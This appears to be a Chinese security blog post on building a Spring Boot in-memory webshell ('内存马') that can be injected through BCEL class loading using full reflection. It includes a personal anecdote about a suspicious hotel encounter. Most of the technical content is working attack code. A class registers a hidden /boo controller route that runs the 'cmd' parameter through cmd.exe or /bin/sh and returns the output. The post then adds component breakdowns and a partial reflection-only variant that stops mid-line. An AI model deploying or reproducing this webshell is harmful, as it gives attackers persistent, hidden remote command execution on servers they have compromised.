<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>BCEL环境下利用全反射构造高可用内存马 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="BCEL环境下利用全反射构造高可用内存马 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/02/29/BCEL%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8%E5%85%A8%E5%8F%8D%E5%B0%84%E6%9E%84%E9%80%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-29T00:42:06.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>29,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">BCEL环境下利用全反射构造高可用内存马</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="一、回顾BCEL字节码"><a href="#一、回顾BCEL字节码" class="headerlink" title="一、回顾BCEL字节码"></a>一、回顾BCEL字节码</h1><p>文章在先知社区首发</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/tznwzgs310vslquv?view=doc_embed">BCEL-ClassLoader赛博学习</a><br>懒狗写过一篇文章。所以就不多说BCEL字节码是个啥了。BCEL加载类有一个特点，只可以加载jdk原生的类，比如spring下面的所有类，都会报错ClassnotFound的错误。因此全反射诞生~<br>但是很遗憾的告诉大家，BCEL的ClassLoader在8u252后告别了大家~<br>但谁会用那么高版本的jdk呢^ ^</p>
<h1 id="、惊险小插曲"><a href="#、惊险小插曲" class="headerlink" title="[*]、惊险小插曲"></a>[*]、惊险小插曲</h1><p>现在是8.10 凌晨三点，我十二点下的飞机，最晚本来一点多就该到酒店了，可是经历了一次惊险的逃亡。由于是定的机票捆绑了机场酒店，我也没多想，就直接去了，结果到那是十二点半。酒店前台灯全是关的，也就是漆黑一片，当我怀疑被骗了的时候我打了一下高德地图里面酒店的电话。结果捏，酒店门口不是停了一些车子。车子上面有人看到我打了电话，下来了一个人。问我是不是入住的。我很爽快的说，yes sir。结果第一件事情是递我一根烟，让我出示身份证，到目前一切正常，拿到我身份证也不打开电脑核对，瞎几把看了一圈我的身份证后他妈和我说酒店住满了，要带我换酒店，到这里我的警觉神经就拉满了，我试探性问了一句去那个酒店。他随口来一句：如意酒店。我摸摸搜了一下，就在对面200米，但他让我上他的车，他送我。然后我说不用了，多麻烦，我自己走过去，他坚持要送我，然后夺命三连问：”你是本地人?”,”你几个人来的?”,”你家在哪?”。好家伙还查我户口，那我必然说是本地人，家在附近只是过个夜。<br>这里多亏我到目的后第一件事不是入住酒店，而是点一波烧烤。。。。而且好在烧烤师傅烤的贼几把烂，烤好久没烤好，我就说，你先等我一下，我先吃完烧烤。他说行，然后回到车子上。还给烧烤师傅和我都低了一根烟（现在我复盘，什么酒店老板会给烟的？他妈的他压根可能就不是老板）。在这时候，我就直接高德地图叫了个车，运气好，四分钟就到，而且我一直不让那byd发现我点了车，一直在烧烤店旁边周旋，假装在等烧烤（现在我他吗发现烧烤店老板肯定也是知道那个男的不是酒店老板，都在那里100米之内的店铺，老板是谁怎么可能不知道啊？不告诉我就说明有鬼啊）。然后车到了，我直接结账烧烤，就算烧烤没考好我也开润了。您猜怎么着，我猜对了，看到我马不停蹄的上车，烧烤店的老板也不问我要不要烧烤，那个车里的人看到我也不问我咋回事，就放我跑了。<br>最骚的是什么，等我到了市中心的一个全季酒店后，我继续拨打了刚刚没打通的前台电话，一阵ob下来，他说他们在房间休息，前台没人。我说那刚刚的老板是谁，他们说不认得。果然机场酒店不能随便住，最好也别晚上的航班了，还是一个人。给我整的人都是懵逼的。byd还好我跑得快，不然我不知道那b东西想干嘛。都2023年了，不会吧不会吧。<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/32634994/1691608523065-dc8f7053-dc3e-43b2-b728-d2f2f2e523e4.jpeg#averageHue=%23cbc5ae&clientId=u8f5d9969-e0bd-4&from=paste&height=422&id=gi3dh&originHeight=528&originWidth=500&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58270&status=done&style=none&taskId=u883dab11-0a1c-4fa7-87da-6658448ecf0&title=&width=400" alt="9fad1b535bb5da21ab0f7d5cf225949f.jpg"><br>真是惊险，也是倒霉，怎么遇上这事情呢。我测试他的<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691608744420-078b8871-fc4f-495b-a9f0-b8f644ff4b2a.png#averageHue=%233e3521&clientId=u1e300139-0fb9-4&from=paste&height=38&id=AnlE1&originHeight=48&originWidth=48&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3590&status=done&style=none&taskId=u39233fba-a732-48cc-8b04-ddf824e2828&title=&width=38.4" alt="00391CD9.png"></p>
<h1 id="二、正常的注入流程"><a href="#二、正常的注入流程" class="headerlink" title="二、正常的注入流程"></a>二、正常的注入流程</h1><p>抛开这个小插曲<br>回顾一下咱们正常的SpringBoot内存马。	</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectToController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectToController</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span>(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> InjectToController.class.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/boo&quot;</span>)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">InjectToController</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectToController</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二个构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectToController</span><span class="params">(String aaa)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// controller指定的处理方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span>  IOException&#123;</span><br><span class="line">        <span class="comment">// 获取request和response对象</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是正常的springboot内存马。我们重温一下来解构一下内存马的几个重要组成部分。</p>
<h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>我们肯定都是需要获取到上下文才有后续的一些操作，这里我们用的是一种比较通用的获取上下文</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>从上下文中我们可以获取自动注册的Bean，接着就可以进一步的利用了。</p>
<h2 id="恶意Function"><a href="#恶意Function" class="headerlink" title="恶意Function"></a>恶意Function</h2><p>恶意function也就是我们命令执行的方法了。上述内存马用着的方法如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// 获取request和response对象</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>会判断操作平台，是linux还是windows，方便我们设置木马的编码。<br>用的是一个比较通用的回显方法，用scanner去输出。对于windows平台scanner需要做一下编码处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(builder.start().getInputStream(),<span class="string">&quot;gbk&quot;</span>).useDelimiter(<span class="string">&quot;wocaosinidema&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>加上gbk的编码即可。然后<code>response.setCharacterEncoding(&quot;gbk&quot;);</code>设置response响应的编码，就可以避免中文乱码了。</p>
<h2 id="RequestMappingHanlder"><a href="#RequestMappingHanlder" class="headerlink" title="RequestMappingHanlder"></a>RequestMappingHanlder</h2><p>内存马最重要的部分就是他了，我们后续也是围绕着它展开，MappingHandler是我们添加恶意方法路由的地方。我们最终都是为了获取到它，然后将我们的恶意类绑定到指定的路由，对应内存马的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span>(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">       <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> InjectToController.class.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">       <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">       <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/boo&quot;</span>)</span><br><span class="line">               .options(config)</span><br><span class="line">               .build();</span><br><span class="line">       <span class="type">InjectToController</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectToController</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br></pre></td></tr></table></figure>
<p>这几行代码完成了恶意路由的创建和注册。<br>这三个部分就是内存马的核心。我们接下来围绕这个展开。</p>
<h1 id="三、BCEL环境下注入构造"><a href="#三、BCEL环境下注入构造" class="headerlink" title="三、BCEL环境下注入构造"></a>三、BCEL环境下注入构造</h1><p>网上的文章几乎没有，所以需要自己多尝试<br>前面也说了，BCEL环境下只可以加载jdk原生的东西，所以有关其他依赖比如spring的依赖。我们只可以通过反射去调用，也称为”全反射”</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.spel.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelInjectToController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BcelInjectToController</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">springLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">currentRequestAttributesMethod</span> <span class="operator">=</span> springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>).getMethod(<span class="string">&quot;currentRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RequestFace</span> <span class="operator">=</span> currentRequestAttributesMethod.invoke(springLoader.loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRequest</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getRequest.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getResponse</span> <span class="operator">=</span> RequestFace.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">response</span> <span class="operator">=</span> getResponse.invoke(RequestFace);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getParameter</span> <span class="operator">=</span> request.getClass().getDeclaredMethod(<span class="string">&quot;getParameter&quot;</span>,String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">sendError</span> <span class="operator">=</span> response.getClass().getDeclaredMethod(<span class="string">&quot;sendError&quot;</span>,<span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd= (String) 